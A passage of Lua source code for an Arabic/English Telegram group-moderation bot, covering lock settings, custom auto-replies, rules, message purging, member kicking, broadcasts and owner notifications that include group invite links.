.."◾️ *Lock MarkDown* : "..markdown.."\n"
.."️◾️ *Lock TgService* : "..lock_tgservice.."\n"
.."◾️ *Lock Flood* : "..mute_flood.."\n"
.."◾️ *Flood Status* : "..floodstatus.."\n"
.."◾️ *Flood Sensitivity* : [ "..flood_m.." ]\n"
.."️◾️ *Spam Sensitivity* : [ "..spam_c.." ]\n\n"
.." 🔇 *Media Settings* :\n\n"
.."◽️ *Lock Text* : "..mute_text.."\n"
.."◽️ *Lock Photo* : "..mute_photo.."\n"
.."◽️ *Lock Videos* : "..mute_video.."\n"
.."◽️ *Lock Gifs* : "..mute_gifs.."\n"
.."◽️ *Lock Music* : "..mute_music.."\n"
.."◽️ *Lock Voice* : "..mute_voice.."\n"
.."◽️ *Lock File* : "..lock_file.."\n"
.."◽️ *Lock Sticker* : "..lock_sticker.."\n"
.."◽️ *Lock Contact* : "..lock_contact.."\n"
.."️◽️ *Lock location* : "..lock_location.."\n"
TXTEN = TXTEN:gsub("yse✅","yse✅")
TXTEN = TXTEN:gsub("#no❎","'no❎'")
TXTEN = TXTEN:gsub("بالمسح","Deleting")
TXTEN = TXTEN:gsub("بالطرد","Kicking")
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, TXTEN, 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, TXTAR, 1, 'md')
end
end
end
---------------------------------------bot--------------------------------------------------------
if text:match("^كول (.*)$")  then
local txt = {string.match(text, "^(كول) (.*)$")}
botdx(msg.chat_id_,0, 1, txt[2], 1, 'md')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
-----------------
if (text and text == 'enable reply bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Enable Reply Bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تفعيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
if botx1:get(BOT..'bot:lang:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '📚⁞ *Reply bot is already enabled*️ •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '📚⁞ تم تفعيل ردود البوت سابقا •', 1, 'md')
end
else
if botx1:get(BOT..'bot:lang:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '📚⁞ *Reply bot has been enable*️ •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '📚⁞ تم تفعيل ردود البوت •', 1, 'md')
botx1:del(BOT..'bot:rep:mute'..msg.chat_id_)
end
end
end
if (text and text == 'disable reply bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Disable Reply Bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تعطيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'bot:rep:mute'..msg.chat_id_) then
if botx1:get(BOT..'bot:lang:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '📚⁞ *Reply bot is already disabled*️ •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '📚⁞ تم تعطيل ردود البوت سابقا •', 1, 'md')
end
else
if botx1:get(BOT..'bot:lang:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '📚⁞ *Reply bot has been disabled*️ •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '📚⁞ تم تعطيل ردود البوت •', 1, 'md')
botx1:set(BOT..'bot:rep:mute'..msg.chat_id_,true)
end
end
end
---------------------------------------bot--------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etrules (.*)$") then
local txt = {string.match(text, "^([Ss]etrules) (.*)$")}
botx1:set(BOT..'bot:rules'..msg.chat_id_, txt[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Group rules has been saved •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم وضع قوانين المجموعه •', 1, 'md')
end
end
if text:match("^ضع قوانين (.*)$") then
local txt = {string.match(text, "^(ضع قوانين) (.*)$")}
botx1:set(BOT..'bot:rules'..msg.chat_id_, txt[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Group rules has been saved •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم وضع قوانين المجموعه •', 1, 'md')
end
end
end
-------------------------------------------bot----------------------------------------------------
if text:match("^ضع ملاحظه (.*)$") and is_leader(msg) then
local txt = {string.match(text, "^(ضع ملاحظه) (.*)$")}
botx1:set(BOT..'owner:note1', txt[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Saved •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم حفظ الملاحظه ارسل جلب الملاحظه لعرضها •', 1, 'md')
end
end
---------------------------------------bot--------------------------------------------------------
if text:match("^جلب الملاحظه$") and is_leader(msg) then
local note = botx1:get(BOT..'owner:note1')
botdx(msg.chat_id_, msg.id_, 1, note, 1, nil)
end
-----------------------------------bot--------------------------------------------------------------
if text:match("^[Rr]ules$") or text:match("^القوانين$") then
local rules = botx1:get(BOT..'bot:rules'..msg.chat_id_)
botdx(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
-----------------------------------------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الروابط$") then
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
mute_links = 'مقفوله 🚩'
else
mute_links = 'مفتوحه 📍'
end
local bot = "🎖⁞ اعدادات الروابط 🔻 :\n\n"
.." الروابط : "..mute_links.."\n"
botdx(msg.chat_id_, msg.id_, 1, bot, 1, 'md')
end
end
---------------------------------------------bot--------------------------------------------------
if text:match("^ضع اسم (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Group name has been changed •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم تغيير اسم المجموعه •', 1, 'md')
end
end
--------------------------------------------bot---------------------------------------------------
if text:match("^ضع صوره$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Plese send group photo •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ ارسل لي الصوره الان •', 1, 'md')
end
botx1:set(BOT..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
-----------------------------------------------------------------------------------------------
if text:match('^gplist$') or text:match('^المجموعات$') then
local list = botx1:smembers(BOT.."bot:groups")
local t = '🚦⁞ مجموعات البوت •\n\n'
for k,v in pairs(list) do
t = t..k.." - {`"..v.."`}\n" 
end
if #list == 0 then
t = '🚦⁞ لا يوجد مجموعات مفعله •'
end
botdx(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end
----------------------------by faede-------------------------------------------------------------------
if text:match("^الغاء تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
unpinmsg(msg.chat_id_)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم الغاء تثبيت الرساله •', 1, 'md')
end
------------------------------by bot-----------------------------------------------------------------
if text:match("^اعاده تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local pin_id = botx1:get(BOT..'pinnedmsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم اعاده تثبيت الرساله •', 1, 'md')
else
end
end       
-----------------------------------------------------------------------------------------------
if text:match("^kick delete$") or text:match("^طرد الحسابات المحذوفه$") then
local function deleteaccounts(extra, result)
for k,v in pairs(result.members_) do 
local function cleanaccounts(extra, result)
if not result.first_name_ then
changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
end
end
getUser(v.user_id_, cleanaccounts, nil)
end 
botdx(msg.chat_id_, msg.id_, 0,'🚦⁞ تم طرد الحسابات المحذوفه •', 1, 'md')
end 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
end
--------------------------------------------------------------------------------clean kicked
if text:match("^clean kicked$") or text:match("^تنظيف قائمه الحظر$") then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
botdx(msg.chat_id_, msg.id_, 0,'🚦⁞ لا يوجد محظورين •', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
x = x + 1
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
end
botdx(msg.chat_id_, msg.id_, 0,'🚦⁞ تم تنظيف قائمه حظر الكروب •', 1, 'md')
end
end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end
-----------------------------------------------------------------------------------------------
if text:match("^(gpinfo)$") or text:match("^معلومات المجموعه$") then
function gpinfo(arg,data)
-- vardump(data) 
botdx(msg.chat_id_, msg.id_, 1, '💳⁞ ايديها  • '..msg.chat_id_..'\n💷⁞ عدد الادمنيه • *'..data.administrator_count_..'*\n🚷⁞ عدد المحظورين • *'..data.kicked_count_..'*\n📱⁞ عدد الاعضاء • *'..data.member_count_..'*\n', 1, 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
--------------------------------bot--------------------------------------------------------------
if text == 'تفعيل البوت الخدمي' then 
local  bot = '🚦⁞ تم تفعيل البوت الخدمي •'
botdx( msg.chat_id_, msg.id_, 1, bot, 1, "md") 
botx1:del(BOT..'lock:bot:free'..bot_id) 
end 
if text == 'تعطيل البوت الخدمي' then 
bot = '🚦⁞ تم تعطيل البوت الخدمي •'
botdx( msg.chat_id_, msg.id_, 1, bot, 1, "md") 
botx1:set(BOT..'lock:bot:free'..bot_id,true) 
end
if text == 'تفعيل اللعبه' then   
bot = '*🚏 ⁞ تم تفعيل اللعبه ✅*'  
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md')
botx1:set(BOT..'bot:lock_geam'..msg.chat_id_,true)  
end
if text == 'تعطيل اللعبه' then  
bot = '*🚏 ⁞ تم تعطيل اللعبه ✅*'  
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md')
botx1:del(BOT..'bot:lock_geam'..msg.chat_id_) 
end
if text == 'تفعيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) then   
if botx1:get(BOT..'lock:get:photo'..msg.chat_id_) then
bot = '*🚏 ⁞ تم تفعيل جلب الصوره الشخصيه ✅*' 
botdx( msg.chat_id_, msg.id_, 1, bot, 1, "md") 
botx1:del(BOT..'lock:get:photo'..msg.chat_id_) 
else
bot = '*🚏 ⁞ جلب الصوره الشخصيه مفعل مسبقا ✅*' 
botdx( msg.chat_id_, msg.id_, 1, bot, 1, "md") 
end
end
if text == 'تعطيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) then   
if not botx1:get(BOT..'lock:get:photo'..msg.chat_id_) then
bot = '*🚏 ⁞ تم تعطيل جلب الصوره الشخصيه ✅*'  
botdx( msg.chat_id_, msg.id_, 1, bot, 1, "md") 
botx1:set(BOT..'lock:get:photo'..msg.chat_id_,true) 
else
bot = '*🚏 ⁞ جلب الصوره الشخصيه معطل مسبقا ✅*'  
botdx( msg.chat_id_, msg.id_, 1, bot, 1, "md") 
end
end
if text:match('^تفعيل$') then
function adding(extra,result,success)
local txt = {string.match(text, "^(تفعيل)$")}
local function promote_admin(extra, result, success)
local admins = result.members_
for i=0 , #admins do
botx1:sadd(BOT..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
botx1:sadd(BOT.."bot:monsh:"..msg.chat_id_,owner_id)
end
end
end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if botx1:get(BOT.."bot:enable:"..msg.chat_id_) then
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل المجموعه سابقا •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ Group Actually added •', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ Group has been added •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🌿⁞ عزيزي المطور •\n☑️ ⁞ تم تفعيل المجموعه •\n📬 ⁞ تم ترفع منشئ المجموعه •\n📨 ⁞ تم رفع ادمنيه المجموعه •', 1, 'md')
end
openChat(msg.chat_id_,bot)
botx1:sadd("bot:addg"..bot_id, msg.chat_id_)
function bot(f1,f2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
botx1:set(BOT.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
botdx(tostring((botx1:get(BOT.."bot:leader:gr") or bot_owner)), 0, 1, "🌿╿❯ تم تفعيل مجموعه جديده • \n🍄┊❯ ايدي الضافني ~ {"..msg.sender_user_id_.."}\n💥┊❯ معرف الضافني ~ @"..(result.username_ or "لا يوجد").."\n✨┊❯ معلومات المجموعه • \n\n📂┊❯ ايدي المجموعه ~ {"..msg.chat_id_.."}\n📍┊❯ اسم المجموعه • {"..f2.title_.."}\n☑️┊❯ رابط المجموعه •\n🚠╽❯  {"..(t2.invite_link_ or "Error").."}" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,bot) 
botx1:set(BOT.."bot:enable:"..msg.chat_id_,true)
botx1:setex(BOT.."bot:charge:"..msg.chat_id_,86400,true)
botx1:sadd("bot:addg"..bot_id, msg.chat_id_)
local send_to_bot_owner = function(extra, result)
local v = tonumber(bot_owner)             
end
end
end
getUser(msg.sender_user_id_,adding)
end
------
if text:match('^تعطيل$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
local txt = {string.match(text, "^(تعطيل)$")}
if not botx1:get(BOT.."bot:enable:"..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ Group Actually Rem •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ المجموعه معطله سابقا •', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ Group has been Rem •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم تعطيل المجموعه •', 1, 'md')
end
botx1:del(BOT.."bot:charge:"..msg.chat_id_)
botx1:del(BOT.."bot:enable:"..msg.chat_id_)
botx1:srem("bot:addg"..bot_id, msg.chat_id_)
local v = tonumber(bot_owner)          
end
end
if text:match('^[Rr]em(-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
local gp = {string.match(text, "^([Rr]em)(-%d+)$")}
botx1:del(BOT.."bot:charge:"..gp[2])
local v = tonumber(bot_owner)       
end
if text:match("^تفعيل كل الكروبات$") then
local gps = botx1:smembers(BOT.."bot:groups") or 0
local gps2 = botx1:smembers("bot:addg"..bot_id) or 0
for i=1,#gps do
botx1:sadd("bot:addg"..bot_id, gps[i])
botx1:set(BOT.."bot:enable:"..gps[i],true)
botx1:set( BOT.."bot:charge:"..gps[i],true)
end
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
end   
if text:match("^تعطيل كل الكروبات$") then
local gps = botx1:smembers(BOT.."bot:groups") or 0
local gps2 = botx1:smembers("bot:addg"..bot_id) or 0
for i=1,#gps do
botx1:del("bot:addg"..bot_id, gps[i])
botx1:del(BOT.."bot:enable:"..gps[i],true)
botx1:del( BOT.."bot:charge:"..gps[i],true)
end
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل *{'..(#gps - #gps2)..'} مجموعه*', 1, 'md')
end   
if text:match("^الدعم$") or text:match("^المطور$") then
function adding(extra,result,success)
function bot(f1,f2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
botx1:set(BOT.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
botdx(tostring((botx1:get(BOT.."bot:leader:gr") or bot_owner)), 0, 1, "🌿╿❯ هناك من بحاجه للمساعده • \n🍄┊❯ ايدي الشخص ~ {"..msg.sender_user_id_.."}\n💥┊❯ معرف الشخص ~ @"..(result.username_ or "لا يوجد").."\n✨┊❯ معلومات المجموعه • \n\n📂┊❯ ايدي المجموعه ~ {"..msg.chat_id_.."}\n📍┊❯ اسم المجموعه • {"..f2.title_.."}\n☑️┊❯ رابط المجموعه •\n🚠╽❯  {"..(t2.invite_link_ or "Error").."}" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,bot) 
end
getUser(msg.sender_user_id_,adding)
end
------------------------------------bot----------------------------------------------------------
if text and text:match("^نشر بالخاص (.*)") and is_leader(msg) then
if not botx1:get(BOT..'lock:add'..msg.chat_id_) then
local pm =  text:match("^نشر بالخاص (.*)")
local s2a = "🚦⁞ تم ارسال رسالتك الى •\n🗳⁞ (* GP *) شخص في خاص البوت •\n‏"
local gp = tonumber(botx1:scard(BOT.."bot:userss"))
gps = botx1:smembers(BOT.."bot:userss")
text = s2a:gsub('GP',gp)
for k,v in pairs(gps) do
botdx(v, 0, 1,pm, 1, 'md')
end
botdx(msg.chat_id_, msg.id_, 1,text, 1, 'md')
end 
end
-------------bot     
text = msg.content_.text_
if msg.content_.text_ == 'مسح رد' and  is_owner(msg.sender_user_id_, msg.chat_id_) then
botx1:set(BOT..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ حسننا ارسل الكلمه التريد مسحها 📬" ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = botx1:get(BOT..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'del_repgp1' then
botdx(msg.chat_id_, msg.id_, 1,'🚦⁞ الكلمه *('..msg.content_.text_..')*\n تم مسحها ☑️',  1, "md")
botx1:del(BOT..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
botx1:del(BOT..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
botx1:del(BOT..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
botx1:del(BOT..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
botx1:del(BOT..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
botx1:del(BOT..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
botx1:del(BOT..'rep_owner'..msg.content_.text_..''..msg.chat_id_..'')
return false
end
end
--------------------------------------------------------------------------
if msg.content_.text_ == 'اضف رد' and is_owner(msg.sender_user_id_, msg.chat_id_)  then
botx1:set(BOT..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ حسننا ارسل لي الكلمه الان 📬" ,  1, "md")
return false    end
if msg.content_.text_ then
local content_keep = botx1:get(BOT..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_keep == 'set_repgp' then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ حسننا ارسل لي الرد •\n🌿⁞ يمكنك اضافه { نص ، بصمه ، متحركه ، ملصق }" ,  1, "md")
botx1:set(BOT..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
botx1:set(BOT..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
botx1:sadd(BOT..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
 text = msg.content_.text_
if msg.content_.text_ == 'مسح رد للكل' then
botx1:set(BOT.."add:repallt"..msg.sender_user_id_,'del_rep1')
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ حسننا ارسل الكلمه التريد مسحها 📬" ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = botx1:get(BOT.."add:repallt"..msg.sender_user_id_)
if content_text == 'del_rep1' then
botdx(msg.chat_id_, msg.id_, 1,'🚦⁞ الكلمه *('..msg.content_.text_..')*\n تم مسحها ☑️',  1, "md")
botx1:del(BOT.."add:repallt"..msg.sender_user_id_)
botx1:del(BOT.."gif_repall"..msg.content_.text_)
botx1:del(BOT.."voice_repall"..msg.content_.text_)
botx1:del(BOT.."stecker_repall"..msg.content_.text_)
botx1:del(BOT.."video_repall"..msg.content_.text_)
botx1:del(BOT.."text_repall"..msg.content_.text_)
botx1:del(BOT.."rep_sudo",msg.content_.text_)
return false
end
end
--------------------------------------------------------------------------
if msg.content_.text_ == 'اضف رد للكل' then
botx1:set(BOT.."add:repallt"..msg.sender_user_id_,'set_rep')
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ حسننا ارسل لي الكلمه الان 📬" ,  1, "md")
return false    end
if msg.content_.text_ then
local content_keep = botx1:get(BOT.."add:repallt"..msg.sender_user_id_)
if content_keep == 'set_rep' then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ارسل الرد •\n🌿⁞ يمكنك اضافه {نص ، بصمه ، متحركه ، ملصق}" ,  1, "md")
botx1:set(BOT.."add:repallt"..msg.sender_user_id_,'save_rep')
botx1:set(BOT.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
botx1:sadd(BOT.."rep_sudo",msg.content_.text_)
return false 
end    end
-------------------------------------------------------------------------
if  msg.content_.text_ == 'الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) then
local redod = botx1:smembers(BOT..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ لا توجد ردود مضافه 🏷" ,  1, "md")
else
msg_rep = '🚦⁞ ردود المجموعه •\n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k..' ~ *{ '..v..' }* \n' 
end
botdx(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
end
return false
end
-------------------------------------------------------------------------------
if msg.content_.text_ == 'مسح الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) then
local redod = botx1:smembers(BOT..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ لا توجد ردود مضافه 🏷" ,  1, "md")
else
for k,v in pairs(redod) do
botx1:del(BOT..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
botx1:del(BOT..'gif_repgp'..v..msg.chat_id_)
botx1:del(BOT..'voice_repgp'..v..msg.chat_id_)
botx1:del(BOT..'stecker_repgp'..v..msg.chat_id_)
botx1:del(BOT..'video_repgp'..v..msg.chat_id_)
botx1:del(BOT..'text_repgp'..v..msg.chat_id_)
botx1:del(BOT..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
end
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حذف جميع الردود ☑️" ,  1, "md")
return false
end
end
----------------------------------------------------------------------------
if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) then
local redod = botx1:smembers(BOT.."rep_sudo")
if #redod == 0 then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ لا توجد ردود مضافه 🏷" ,  1, "md")
else
local i = 1
msg_rep = '🚦⁞ ردود المطور •\n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k.." ~ *{ "..v.." }* \n"
end
botdx(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
end
return false
end
-------------------------------------------------------------------------------
if msg.content_.text_ == "مسح ردود المطور" and is_sudo(msg) then
local redod = botx1:smembers(BOT.."rep_sudo")
if #redod == 0 then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ لا توجد ردود مضافه 🏷" ,  1, "md")
else
for k,v in pairs(redod) do
botx1:del(BOT.."add:repallt"..v)
botx1:del(BOT.."gif_repall"..v)
botx1:del(BOT.."voice_repall"..v)
botx1:del(BOT.."stecker_repall"..v)
botx1:del(BOT.."video_repall"..v)
botx1:del(BOT.."text_repall"..v)
botx1:del(BOT.."rep_sudo",msg.content_.text_)
end
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حذف جميع ردود المطور ☑️" ,  1, "md")
return false
end
end 
----------------------------------------------bot-------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match('^مسح (%d+)$') then
local matches = {string.match(text, "^(مسح) (%d+)$")}
if msg.chat_id_:match("^-100") then
if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
pm = '🚦⁞ Please use a number greater than 1 and less than 100 •'
else
pm = '📯|| اختر رقم اكبر من 1 واقل من 100 🚩'
end
send(msg.chat_id_,0, 1, pm, 1, 'html')
else
tdcli_function ({
ID = "GetChatHistory",
chat_id_ = msg.chat_id_,
from_message_id_ = 0,
offset_ = 0,
limit_ = tonumber(matches[2])
}, delmsg, nil)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
pm ='🚦⁞ *'..matches[2]..' recent message removed* •'
else
pm ='🚦|| '..matches[2]..' من الرسائل تم مسحها ✅'
end
botdx(msg.chat_id_,0, 1, pm, 1, 'html')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
pm ='🚦⁞ This is not possible in the conventional group •'
else
pm ='🎈|| هناك خطا ❎'
end
botdx(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
end
end
if text:match('^[Cc]lean (%d+)$') then
local matches = {string.match(text, "^([Cc]lean) (%d+)$")}
if msg.chat_id_:match("^-100") then
if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
pm = '🚦⁞ Please use a number greater than 1 and less than 100 •'
else
pm = '📯|| اختر رقم اكبر من 1 واقل من 100 🚦'
end
send(msg.chat_id_,0, 1, pm, 1, 'html')
else
tdcli_function ({
ID = "GetChatHistory",
chat_id_ = msg.chat_id_,
from_message_id_ = 0,
offset_ = 0,
limit_ = tonumber(matches[2])
}, delmsg, nil)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
pm ='🚦⁞ *'..matches[2]..' recent message removed* •'
else
pm ='🎈|| '..matches[2]..' من الرسائل تم مسحها ✅'
end
botdx(msg.chat_id_,0, 1, pm, 1, 'html')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
pm ='🚦⁞ This is not possible in the conventional group •'
else
pm ='🎈|| هناك خطا ❎'
end
botdx(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
end
end
end
--------------------------------bot--------------------------------------------------------------
if is_leader(msg) and text:match("^استعاده الاوامر$") then
botx1:del(BOT..'bot:help', text)
botx1:del(BOT..'bot:help1', text)
botx1:del(BOT..'bot:help2', text)
botx1:del(BOT..'bot:help3', text) 
botx1:del(BOT..'bot:help4', text)
botx1:del(BOT..'bot:help5', text) 
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم استعاده الكلايش الاصليه ☑️" ,  1, "md") 
end
if is_leader(msg) and text:match("^تعيين الاوامر$") then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ارسل لي الكليشه الان •" ,  1, "md")
botx1:set(BOT..'bot:help0'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local bot =  botx1:get(BOT..'bot:help0'..msg.sender_user_id_..'')
if bot == 'msg' then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حفظ الكليشه الجديده •" ,  1, "md")
botx1:set(BOT..'bot:help0'..msg.sender_user_id_..'', 'no')
botx1:set(BOT..'bot:help', text)
botdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^الاوامر$") then
local help = botx1:get(BOT..'bot:help')
local text =  [[
🚦*⁞* اوامر البــوت 
┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏

  🎙*⁞* م¹ *⁞* ٱوٱمـر الحمايه ✓

  🎙*⁞* م² *⁞* ٱوٱمـر الادمنيه والمدراء ✓

  🎙*⁞* م³ *⁞* ٱوٱمـر الخدمه ✓

  🎙*⁞* م⁴ *⁞* ٱوٱمـر الوضع والمسح ✓

  🎙*⁞* م⁵ *⁞* ٱوٱمـر ٱلمطـورين ✓

┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
]] 
botdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if is_leader(msg) and text:match("^تعيين امر م1$") then
